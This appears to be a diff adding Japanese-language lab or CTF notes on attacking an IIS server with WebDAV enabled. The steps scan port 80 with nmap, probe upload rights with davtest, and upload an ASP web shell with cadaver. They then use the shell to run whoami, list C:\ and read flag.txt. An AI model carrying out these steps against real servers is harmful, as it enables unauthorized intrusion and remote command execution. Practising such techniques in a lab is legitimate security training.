@@ -1,0 +1,24 @@
+windows:IISサーバーDAV test
+1) nmapでターゲットのポートスキャンをして、セキュリティホールを探す
+2) 以下のコマンドを実行して、ポート80で実行されている詳細な情報を得る
+nmap --script http-enum -sV -p 80 ターゲットドメイン
+3) davtestを使って、WebDAV機能が有効な特定のURLに対して、セキュリティ保護されているかを確認する
+davtest -url http://ターゲットドメイン
+
+*davtestは、WebDAVの機能が有効なサーバーに対して、攻撃者がファイルを作成、変更、削除できるかどうかを検証すること。
+
+4) davtestとクレデンシャルを使って、webdavに重要なファイルがアップロードされているかを確認する。
+davtest -auth ユーザー名:パスコード -url http://ターゲットドメイン/webdav
+
+5) cadaverを使って、ターゲットマシン上の.aspのバッグドアを/webdavディレクトリにアップロードする
+cadaver http://ターゲットドメイン/webdav
+
+6) 以下のコマンドを使って、aspバッグドアをIIS Webサーバーのwebdavディレクトリにアップロードする
+put /usr/share/webshells/asp/webshell.asp
+ls
+
+7) firefoxを起動して、検索ボックスにhttp://ターゲットドメイン/webdav/webshell.aspを入力する
+8) ページの中の検索ボックスにwhoamiを入力する
+9) ページの中の検索ボックスにC:\を入力する
+10) ページの中の検索ボックスにtype:flag.txtを入力する
+  
